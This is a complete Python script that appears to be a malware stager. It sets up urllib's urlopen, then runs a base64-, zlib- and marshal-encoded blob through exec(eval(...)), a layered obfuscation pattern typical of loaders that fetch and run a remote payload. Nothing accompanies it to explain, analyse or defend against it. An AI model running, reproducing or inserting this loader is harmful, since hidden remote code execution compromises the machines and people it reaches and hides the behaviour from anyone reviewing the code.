import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrtmJgYCgtyskvSM3TUM8oKSmw0te3NNMzt9AzNDPSM7SwtDIyNtLXLy5JTE8tKtbPi7DQK6hU19QrSk1M0dAEADAjEdQ=')))))